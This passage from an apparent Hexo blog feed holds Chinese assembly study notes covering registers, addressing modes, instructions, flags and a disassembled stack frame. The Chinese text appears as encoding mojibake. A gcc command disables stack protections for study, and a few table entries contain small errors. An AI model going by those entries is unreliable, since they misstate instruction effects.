href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    <category term="åšå®¢æµ‹è¯•" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡</title>
    <link href="http://example.com/2020/04/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BB%BB%E5%8A%A1/"/>
    <id>http://example.com/2020/04/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BB%BB%E5%8A%A1/</id>
    <published>2020-04-14T11:43:34.000Z</published>
    <updated>2021-08-13T07:58:08.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡"><a href="#æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡" class="headerlink" title="æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡"></a>æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡</h1><p>æ„Ÿè°¢ä¹å“¥èƒ½èŠ±è´¹æ—¶é—´å’Œç²¾åŠ›æ¥å¸¦å¸¦å¼Ÿå¼Ÿï¼Œå¼Ÿå¼Ÿä¸€å®šåŠªåŠ›</p><p>å€Ÿç€è¿™æ¬¡æœºä¼šï¼Œåˆšå¥½å¤ä¹ å¤ä¹ æ±‡ç¼–çš„çŸ¥è¯†ï¼Œå°†å…¶ç†Ÿç»ƒã€‚</p><p><a href="https://imgchr.com/i/BL2lX4"><img src="https://s1.ax1x.com/2020/11/10/BL2lX4.png" alt="BL2lX4.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hintï¼š</span><br><span class="line"></span><br><span class="line">1. ç¼–è¯‘å‘½ä»¤ï¼šgcc -z execstack -z norelro -no-pie -fno-stack-protector -o program program.c</span><br><span class="line">2. åç¼–è¯‘å‘½ä»¤ï¼šobjdump -d -m i386:x86-64:intel program</span><br><span class="line"></span><br><span class="line">gcc -z execstack -z norelro -no-pie -fno-stack-protector -o test test.c</span><br><span class="line">objdump -d -m i386:x86-64:intel test</span><br><span class="line">æˆ–è€…æ˜¯</span><br><span class="line">gcc -g -c test.c</span><br><span class="line">objdump -d -M intel -S test.o</span><br></pre></td></tr></table></figure><h3 id="å…ˆå·©å›ºä¸‹åŸºç¡€çŸ¥è¯†"><a href="#å…ˆå·©å›ºä¸‹åŸºç¡€çŸ¥è¯†" class="headerlink" title="å…ˆå·©å›ºä¸‹åŸºç¡€çŸ¥è¯†"></a><strong>å…ˆå·©å›ºä¸‹åŸºç¡€çŸ¥è¯†</strong></h3><h2 id="16ä½å¯„å­˜å™¨"><a href="#16ä½å¯„å­˜å™¨" class="headerlink" title="16ä½å¯„å­˜å™¨"></a>16ä½å¯„å­˜å™¨</h2><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>AHç´¯åŠ å™¨(Accumulator)  AL</td><td>å¯ç”¨äºä¹˜ã€é™¤ã€è¾“å…¥/è¾“å‡ºç­‰æ“ä½œ(åœ¨ä¹˜é™¤æŒ‡ä»¤ä¸­æŒ‡å®šç”¨æ¥å­˜æ”¾æ“ä½œæ•°)</td></tr><tr><td></td><td></td></tr><tr><td>BHåŸºåœ°å€å¯„å­˜å™¨(Base Register)  BL</td><td>åœ¨è®¡ç®—å­˜å‚¨å™¨åœ°å€æ—¶ï¼Œå¯ä½œä¸ºåŸºå€å¯„å­˜å™¨ä½¿ç”¨ã€‚</td></tr><tr><td>BL</td><td></td></tr><tr><td>CHè®¡æ•°å¯„å­˜å™¨(Count Register)  CL</td><td>åœ¨å¾ªç¯å’Œå­—ç¬¦ä¸²æ“ä½œæ—¶ï¼Œè¦ç”¨å®ƒæ¥æ§åˆ¶å¾ªç¯æ¬¡æ•°ï¼›åœ¨ä½æ“ä½œä¸­ï¼Œå½“ç§»å¤šä½æ—¶ï¼Œè¦ç”¨CLæ¥æŒ‡æ˜ç§»ä½çš„ä½æ•°ï¼›</td></tr><tr><td>CL</td><td></td></tr><tr><td>DHæ•°æ®å¯„å­˜å™¨(DataRegister)  DL</td><td>åœ¨è¿›è¡Œä¹˜ã€é™¤è¿ç®—æ—¶ï¼Œå®ƒå¯ä½œä¸ºé»˜è®¤çš„æ“ä½œæ•°å‚ä¸è¿ç®—ï¼Œä¹Ÿå¯ç”¨äºå­˜æ”¾I/Oçš„ç«¯å£åœ°å€ã€‚åœ¨16ä½CPUä¸­ï¼ŒAXã€BXã€CXå’ŒDXä¸èƒ½ä½œä¸ºåŸºå€å’Œå˜å€å¯„å­˜å™¨æ¥å­˜æ”¾å­˜å‚¨å•å…ƒçš„åœ°å€ï¼Œä½†åœ¨32ä½CPUä¸­ï¼Œå…¶32ä½å¯„å­˜å™¨EAXã€EBXã€ECXå’ŒEDXä¸ä»…å¯ä¼ é€æ•°æ®ã€æš‚å­˜æ•°æ®ä¿å­˜ç®—æœ¯é€»è¾‘è¿ç®—ç»“æœï¼Œè€Œä¸”ä¹Ÿå¯ä½œä¸ºæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œè¿™äº›32ä½å¯„å­˜å™¨æ›´å…·æœ‰é€šç”¨æ€§ã€‚</td></tr><tr><td>DL</td><td></td></tr></tbody></table><h2 id="32ä½å¯„å­˜å™¨"><a href="#32ä½å¯„å­˜å™¨" class="headerlink" title="32ä½å¯„å­˜å™¨"></a>32ä½å¯„å­˜å™¨</h2><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>eax</td><td>EAXè¢«ç§°ä¸º32ä½ç´¯åŠ å™¨</td></tr><tr><td>ecxï¼ˆè®¡æ•°å¯„å­˜å™¨ï¼‰</td><td>ECXä¸­çš„Cå³Countï¼ˆè®¡æ•°ä¹‹æ„ï¼‰ã€‚åœ¨è®¸å¤šæŒ‡ä»¤ä¸­ï¼ŒECXã€CXã€CLè¢«ç”¨ä½œè®¡æ•°å™¨ã€‚</td></tr><tr><td>edxï¼ˆæ•°æ®å¯„å­˜å™¨ï¼‰</td><td>EDXä¸­çš„Då³Dataï¼ˆæ•°æ®ä¹‹æ„ï¼‰ã€‚åœ¨è¿›è¡Œä¹˜æ³•ç­‰è¿ç®—æ—¶ï¼Œå¸¸ç”¨EDXä¸EAXæˆ–DXä¸AXçš„ç»„åˆæ¥å­˜æ”¾ä¸€ä¸ª4å­—æ•°æˆ–åŒå­—æ•°ã€‚æ­¤å¤–ï¼ŒDXä¹Ÿç”¨æ¥å­˜æ”¾I/Oç«¯å£åœ°å€ã€‚</td></tr><tr><td>ebxï¼ˆåŸºå€å¯„å­˜å™¨ï¼‰</td><td>EBXä¸­çš„Bå³Baseï¼ˆåŸºå€ä¹‹æ„ï¼‰ã€‚EBXä¸BXå¸¸ç”¨æ¥è¡¨ç¤ºå†…å­˜åœ°å€ï¼Œç°åœ¨æ‰€ä½¿ç”¨çš„PCä¸­åœ°å€éƒ½æ˜¯è¾ƒå¤§çš„æ•´æ•°ï¼Œä¸€èˆ¬ä¸ä¼šæ˜¯8ä½ï¼Œæ‰€ä»¥BLå°±ä¸å¸¸ä½¿ç”¨äº†ã€‚</td></tr><tr><td>esp</td><td>ESPæˆ–SPç”¨æ¥æŒ‡ç¤ºå †æ ˆæ®µä¸­çš„æ ˆé¡¶åœ°å€ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ä¸ä½¿ç”¨ESPæˆ–SPåšç®—æœ¯è¿ç®—ã€‚</td></tr><tr><td>ebp</td><td>EBPå’ŒBPå¸¸ç”¨æ¥å­˜æ”¾å†…å­˜åœ°å€ï¼Œå®ƒä»¬åœ¨é»˜è®¤æƒ…å†µä¸‹æŒ‡å‘å †æ ˆæ®µä¸­çš„å­˜å‚¨å•å…ƒã€‚</td></tr><tr><td>esi</td><td>ESIæˆ–SIåœ¨ä¸²æŒ‡ä»¤ä¸­è¡¨ç¤ºæºæ•°æ®ä¸²çš„åœ°å€ã€‚</td></tr><tr><td>edi</td><td>EDIæˆ–DIåœ¨ä¸²æŒ‡ä»¤ä¸­è¡¨ç¤ºç›®çš„æ•°æ®ä¸²çš„åœ°å€ã€‚</td></tr><tr><td>eip</td><td>æŒ‡ä»¤æŒ‡é’ˆEIPã€IP(Instruction Pointer)æ˜¯å­˜æ”¾ä¸‹æ¬¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ¨ä»£ç æ®µçš„åç§»é‡ã€‚</td></tr><tr><td>eflagsï¼ˆFlags Registerï¼‰</td><td>ã€‚æ ‡å¿—å¯„å­˜å™¨ä¹Ÿç§°ä¸ºç¨‹åºçŠ¶æ€å¯„å­˜å™¨æˆ–çŠ¶æ€å¯„å­˜å™¨ã€‚æŒ‡ä»¤æŒ‡é’ˆå’Œæ ‡å¿—å¯„å­˜å™¨ä¸èƒ½ç”¨ä½œæŒ‡ä»¤çš„æ“ä½œæ•°ï¼Œå®ƒä»¬æ˜¯ç”±CPUç›´æ¥æ“çºµçš„ã€‚ç‰¹åˆ«åœ°ï¼ŒEIPå’ŒEFLAGSçš„ä½16ä½åˆ†åˆ«ç”±IPå’ŒFLAGSæ ‡è¯†ã€‚</td></tr><tr><td>cs(Code Segment Register)ä»£ç æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºä»£ç æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>ss(Stack Segment Register)å †æ ˆæ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºå †æ ˆæ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>ds(Data Segment Register)æ•°æ®æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºæ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>es(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>fs(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>gs(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ã€‚</td></tr></tbody></table><h2 id="64ä½å¯„å­˜å™¨"><a href="#64ä½å¯„å­˜å™¨" class="headerlink" title="64ä½å¯„å­˜å™¨"></a>64ä½å¯„å­˜å™¨</h2><table><thead><tr><th>æŒ‡ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>rax</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rbx</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rcx</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rdx</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rsi</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rdi</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rbp</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rsp</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r8</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r9</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r10</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r11</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r12</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r13</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r14</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>r15</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>rip</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>eflags</td><td>ä¸32ä½ç±»ä¼¼</td></tr><tr><td>cs(Code Segment Register)ä»£ç æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºä»£ç æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>ss(Stack Segment Register)å †æ ˆæ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºå †æ ˆæ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>ds(Data Segment Register)æ•°æ®æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºæ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>es(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>fs(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›</td></tr><tr><td>gs(Extra Segment Register)é™„åŠ æ®µå¯„å­˜å™¨</td><td>å…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ã€‚</td></tr></tbody></table><h2 id="å¯»å€æ–¹å¼"><a href="#å¯»å€æ–¹å¼" class="headerlink" title="å¯»å€æ–¹å¼"></a>å¯»å€æ–¹å¼</h2><table><thead><tr><th align="left">å¯»å€æ–¹å¼</th><th align="left">ç¤ºä¾‹</th><th>æ“ä½œå¯¹è±¡</th></tr></thead><tbody><tr><td align="left">ç«‹å³å¯»å€</td><td align="left">1000h</td><td>1000hè¿™ä¸ªæ•°å­—</td></tr><tr><td align="left">ç›´æ¥å¯»å€</td><td align="left">[1000h]</td><td>å†…å­˜1000håœ°å€çš„å•å…ƒ</td></tr><tr><td align="left">å¯„å­˜å™¨å¯»å€</td><td align="left">RAX</td><td>RAXè¿™ä¸ªå¯„å­˜å™¨</td></tr><tr><td align="left">å¯„å­˜å™¨é—´æ¥å¯»å€</td><td align="left">[RAX]</td><td>ä»¥RAXä¸­å­˜çš„æ•°ä½œä¸ºåœ°å€çš„å†…å­˜å•å…ƒ</td></tr><tr><td align="left">åŸºå€å¯»å€</td><td align="left">[RBP+10h]</td><td>å°†RBXä¸­çš„æ•°ä½œä¸ºåŸºå€,åŠ ä¸Š10h,è®¿é—®è¿™ä¸ªåœ°å€çš„å†…å­˜å•å…ƒ</td></tr><tr><td align="left">å˜å€å¯»å€</td><td align="left">[RDI+10h]</td><td>å°†RDIä½œä¸ºå˜å€å¯„å­˜å™¨,å°†å…¶ä¸­çš„æ•°å­—åŠ ä¸Š10h,è®¿é—®è¿™ä¸ªåœ°å€çš„å†…å­˜å•å…ƒ</td></tr><tr><td align="left">åŸºå€åŠ å˜å€å¯»å€</td><td align="left">[RBX+RSI+10h]</td><td>é€»è¾‘åŒä¸Š</td></tr></tbody></table><h2 id="å¸¸è§åŸºç¡€æŒ‡ä»¤"><a href="#å¸¸è§åŸºç¡€æŒ‡ä»¤" class="headerlink" title="å¸¸è§åŸºç¡€æŒ‡ä»¤"></a>å¸¸è§åŸºç¡€æŒ‡ä»¤</h2><table><thead><tr><th>æŒ‡ä»¤ç±»å‹</th><th>æ“ä½œç </th><th>æŒ‡ä»¤ç¤ºä¾‹</th><th>å¯¹åº”ä½œç”¨</th></tr></thead><tbody><tr><td>æ•°æ®ä¼ é€æŒ‡ä»¤</td><td>mov</td><td>mov rax,rbx</td><td>rax = rbx</td></tr><tr><td></td><td></td><td>mov qword ptr [rdi],rax</td><td>*(rdi) = rax</td></tr><tr><td>å–åœ°å€æŒ‡ä»¤</td><td>lea</td><td>lea rax,[rsi]</td><td>rax = &amp; *(rsi)</td></tr><tr><td>ç®—æœ¯è¿ç®—æŒ‡ä»¤</td><td>add</td><td>add rax,rbx</td><td>rax += rbx</td></tr><tr><td></td><td></td><td>add qword ptr [rax],rax</td><td>*(rdi) += rax</td></tr><tr><td></td><td>sub</td><td>sub rax,rbx</td><td>rax -= rbx</td></tr><tr><td>é€»è¾‘è¿ç®—æŒ‡ä»¤</td><td>and</td><td>and rax,rbx</td><td>rax &amp;= rbx</td></tr><tr><td></td><td>xor</td><td>xor rax,rbx</td><td>rax ^= rbx</td></tr><tr><td>å‡½æ•°è°ƒç”¨æŒ‡ä»¤</td><td>call</td><td>call 0x401000</td><td>æ‰§è¡Œ0x40100åœ°å€çš„å‡½æ•°</td></tr><tr><td>å‡½æ•°è¿”å›æŒ‡ä»¤</td><td>ret</td><td>ret</td><td>å‡½æ•°è¿”å›</td></tr><tr><td>æ¯”è¾ƒå‡½æ•°</td><td>cmp</td><td>cmp rax,rbx</td><td>æ ¹æ®raxä¸rbxæ¯”è¾ƒçš„ç»“æœæ”¹å˜æ ‡å¿—ä½</td></tr><tr><td>æ— æ¡ä»¶è·³è½¬å‡½æ•°</td><td>jmp</td><td>jmp 0xa01000</td><td>è·³åˆ°0x401000åœ°å€æ‰§è¡Œ</td></tr><tr><td>æ ˆæ“ä½œæŒ‡ä»¤</td><td>push</td><td>push rax</td><td>å°†raxçš„å€¼å‹å…¥æ ˆä¸­</td></tr><tr><td></td><td>pop</td><td>pop rax</td><td>ä»æ ˆä¸Šå¼¹å‡ºä¸€ä¸ªå…ƒç´ æ”¾å…¥rax</td></tr></tbody></table><h2 id="æ ‡å¿—å¯„å­˜å™¨"><a href="#æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="æ ‡å¿—å¯„å­˜å™¨"></a>æ ‡å¿—å¯„å­˜å™¨</h2><table><thead><tr><th>åç§°</th><th>æ ‡å¿—</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>AF</td><td>è¾…åŠ©è¿›ä½æ ‡å¿—</td><td>å½“è¿ç®—ç»“æœåœ¨ç¬¬3ä½è¿›ä½</td></tr><tr><td>PF</td><td>å¥‡å¶æ•ˆéªŒæ ‡å¿—</td><td>å½“è¿ç®—ç»“æœçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚æœ‰å¶æ•°ä¸ª1æ—¶ç½®1</td></tr><tr><td>SF</td><td>ç¬¦å·æ ‡å¿—</td><td>æœ‰ç¬¦å·æ•´å½¢çš„ç¬¦å·ä½ä¸º1æ—¶ç½®1ï¼Œä»£è¡¨è¿™æ˜¯ä¸€ä¸ªè´Ÿæ•°</td></tr><tr><td>ZF</td><td>é›¶æ ‡å¿—</td><td>å½“è¿ç®—ç»“æœä¸ºå…¨é›¶æ—¶ç½®1</td></tr><tr><td>OF</td><td>æº¢å‡ºæ ‡å¿—</td><td>è¿ç®—ç»“æœåœ¨è¢«æ“ä½œæ•°æ˜¯æœ‰ç¬¦å·æ•°ä¸”æº¢å‡ºæ—¶ç½®1</td></tr><tr><td>CF</td><td>è¿›ä½æ ‡å¿—</td><td>è¿ç®—ç»“æœå‘æœ€é«˜ä½ä»¥ä¸Šè¿›ä½æ—¶ç½®1ï¼Œç”¨æ¥åˆ¤æ–­æ— ç¬¦å·æ•°çš„æº¢å‡º</td></tr></tbody></table><h2 id="å¸¸è§åˆ¤æ–­æŒ‡ä»¤"><a href="#å¸¸è§åˆ¤æ–­æŒ‡ä»¤" class="headerlink" title="å¸¸è§åˆ¤æ–­æŒ‡ä»¤"></a>å¸¸è§åˆ¤æ–­æŒ‡ä»¤</h2><table><thead><tr><th>æŒ‡ä»¤</th><th>cmp a,b æ¡ä»¶ï¼ˆæˆç«‹å°±è·³è½¬ï¼‰</th><th>flagæ¡ä»¶</th></tr></thead><tbody><tr><td>jz/je</td><td>a = b</td><td>ZF = 1</td></tr><tr><td>jnz/jne</td><td>a != b</td><td>ZF = 0</td></tr><tr><td>jb/jnae/jc</td><td>a &lt; b æ— ç¬¦å·</td><td>CF = 1</td></tr><tr><td>ja/jnbe</td><td>a &gt; b æ— ç¬¦å·</td><td></td></tr><tr><td>jna/jbe</td><td>a &lt;= b æ— ç¬¦å·</td><td></td></tr><tr><td>jnc/jnb/jae</td><td>a &gt;= b æ— ç¬¦å·</td><td>CF = 0</td></tr><tr><td>jg/jnle</td><td>a &gt; b æœ‰ç¬¦å·</td><td></td></tr><tr><td>jge/jnl</td><td>a &gt;= b æœ‰ç¬¦å·</td><td></td></tr><tr><td>jl/jnge</td><td>a &lt; b æœ‰ç¬¦å·</td><td></td></tr><tr><td>jle/jng</td><td>a &lt;= b æœ‰ç¬¦å·</td><td></td></tr><tr><td>jo</td><td></td><td>OF = 1 (è¿ç®—ç»“æœåœ¨è¢«æ“ä½œæ•°çš„æ˜¯æœ‰ç¬¦å·æ•°ä¸”æº¢å‡ºæ—¶ç½®1)</td></tr><tr><td>js</td><td></td><td>SF = 1 (è¿™æ˜¯ä¸ªè´Ÿæ•°)</td></tr></tbody></table><h2 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h2><p>äººä»¬æŠŠæ¯ä¸ªå‡½æ•°è‡ªå·±çš„è¿™ä¸€ç‰‡åŒºåŸŸç§°ä¸ºå¸§ï¼Œç”±äºè¿™äº›å¸§éƒ½åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥åˆè¢«ç§°ä¸ºæ ˆå¸§ï¼Œç„¶è€Œæ ˆçš„å†…å­˜åŒºåŸŸå¹¶ä¸ä¸€å®šæ˜¯å›ºå®šçš„ï¼Œè€Œä¸”éšç€æ¯æ¬¡è°ƒç”¨è·¯å¾„ä¸åŒï¼Œæ ˆå¸§çš„ä½ç½®ä¹Ÿä¼šä¸åŒã€‚è™½ç„¶æ ˆçš„å†…å®¹éšç€è¿›æ ˆå’Œå‡ºæ ˆä¼šä¸€ç›´ä¸æ–­å˜åŒ–ï¼Œä½†æ˜¯ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œæ¯ä¸ªå±€éƒ¨å˜é‡ç›¸å½“äºè¯¥å‡½æ•°æ ˆå¸§çš„åç§»ï¼Œéƒ½æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥å¼•å…¥ä¸€ä¸ªå¯„å­˜å™¨æ¥ä¸“é—¨å­˜å‚¨å½“å‰æ ˆå¸§çš„ä½ç½®ï¼Œå³ç”¨ebp,ç§°ä¸ºå¸§æŒ‡é’ˆã€‚ç¨‹åºåœ¨å‡½æ•°åˆå§‹åŒ–é˜¶æ®µèµ‹å€¼ebpä¸ºæ ˆå¸§ä¸­é—´çš„æŸä¸ªä½ç½®ï¼Œè¿™æ ·å¯ä»¥ç”¨ebpå¼•ç”¨æ‰€æœ‰çš„å±€éƒ¨å˜é‡ï¼Œç”±äºä¸Šä¸€å±‚çš„çˆ¶å‡½æ•°ä¹Ÿè¦ç”¨ebpï¼Œå› æ­¤è¦åœ¨å‡½æ•°å¼€å§‹æ—¶å…ˆä¿å­˜ebpï¼Œå†èµ‹å€¼ebpä¸ºè‡ªå·±çš„æ ˆå¸§çš„å€¼ã€‚</p><h2 id="1-ç®€å•èµ‹å€¼"><a href="#1-ç®€å•èµ‹å€¼" class="headerlink" title="1.ç®€å•èµ‹å€¼"></a>1.ç®€å•èµ‹å€¼</h2><p><strong>EBP</strong>ï¼šæ ˆåº•å¯„å­˜å™¨ï¼Œå­˜æ”¾äº†æŒ‡å‘å‡½æ•°æ ˆå¸§æ ˆåº•çš„åœ°å€ </p><p><strong>ESP</strong>ï¼šæ ˆé¡¶å¯„å­˜å™¨ï¼Œå­˜æ”¾äº†æŒ‡å‘å‡½æ•°æ ˆå¸§æ ˆé¡¶çš„åœ°å€ </p><p><strong>EIP</strong>ï¼šæŒ‡ä»¤å¯„å­˜å™¨ï¼ˆç¨‹åºè®¡ç®—å™¨ï¼‰ï¼Œå­˜æ”¾CPUå°†è¦æ‰§è¡Œçš„æŒ‡ä»¤</p><p><strong>RIP</strong>ï¼šæ˜¯ä¿å­˜äº†å½“å‰çš„ç¨‹åºçš„æŒ‡é’ˆï¼ŒåŠ ä¸Šåç§»ï¼Œå°±å¯ä»¥ç´¢å¼•åˆ°é™æ€å˜é‡çš„ç©ºé—´ã€‚</p><p><strong>rsp</strong>:   æ˜¯éšæ—¶å¯èƒ½å˜åŒ–çš„(64ä½çš„å‡½æ•°è°ƒç”¨)</p><p><strong>rbp</strong>:  æ¥ä½œä¸ºå‚æ•°å’Œå±€éƒ¨å˜é‡çš„åŸºå€(64ä½çš„å‡½æ•°è°ƒç”¨)</p><h4 id="1-qword-2-dword-4-word-8-Byte-64-bit-eg-â€™1â€™-0x31"><a href="#1-qword-2-dword-4-word-8-Byte-64-bit-eg-â€™1â€™-0x31" class="headerlink" title="1 qword = 2 dword = 4 word = 8 Byte = 64 bit eg:â€™1â€™ = 0x31"></a>1 qword = 2 dword = 4 word = 8 Byte = 64 bit eg:â€™1â€™ = 0x31</h4><h3 id="ç¬¬ä¸€é¢˜"><a href="#ç¬¬ä¸€é¢˜" class="headerlink" title="ç¬¬ä¸€é¢˜"></a>ç¬¬ä¸€é¢˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">55                   push   rbp      ;å°†å‡½æ•°ï¼ˆæ¯”å¦‚mainï¼‰çš„æ ˆåº•å‹åˆ°æ ˆ</span><br><span class="line">48 89 e5             mov    rbp,rsp  //espå’Œebpéƒ½æŒ‡å‘æ ˆé¡¶</span><br><span class="line">c7 45 f8 01 00 00 00 mov    DWORD PTR [rbp-0x8],0x1 ;ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€èµ‹å€¼ 1</span><br><span class="line">c7 45 fc 02 00 00 00 mov    DWORD PTR [rbp-0x4],0x2 ;ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€èµ‹å€¼ 2</span><br><span class="line">b8 00 00 00 00       mov    eax,0x0 ;å°†å¯„å­˜å™¨æ¢å¤</span><br><span class="line">5d                   pop    rbp     ;å°†å‡½æ•°è¿”å›çš„åœ°å€å¼¹å‡ºå¹¶è®°å½•</span><br><span class="line">c3                   ret            ;è¿”å›å¼¹å‡ºçš„åœ°å€</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å°±å¤ä¹ å¤ä¹ ä¸‹ä¸€æ±‡ç¼–è¯­è¨€</p><p>ç€é‡åˆ†æä¸€ä¸‹</p><p>æ±‡ç¼–ä¹¦ä¸­æˆ‘ä»¬æ˜¯ç”¨ ebp å’Œ esp </p><p>è€Œåœ¨å®é™…åº”ç”¨ç¯å¢ƒä¸­ï¼Œç¨‹åºæ˜¯64ä½çš„ï¼Œå°±éœ€è¦ç”¨rbpå’Œespæ¥ä»£æ›¿32ä½çš„ebpå’Œespå¯„å­˜å™¨ã€‚</p><p>rbpæŒ‡å‘å‡½æ•°å…¥å£ä¸Šå †æ ˆçš„é¡¶éƒ¨ï¼Œx86çš„å †æ ˆæœå‘ä½åœ°å€ï¼›</p><p>æ‰€ä»¥è®¿é—®åœ°å€ä¸ºrbpçš„è´Ÿåœ°å€<code>[rbp-0x8]</code></p><h3 id="ç¬¬äºŒé¢˜"><a href="#ç¬¬äºŒé¢˜" class="headerlink" title="ç¬¬äºŒé¢˜"></a>ç¬¬äºŒé¢˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">55                   push   rbp             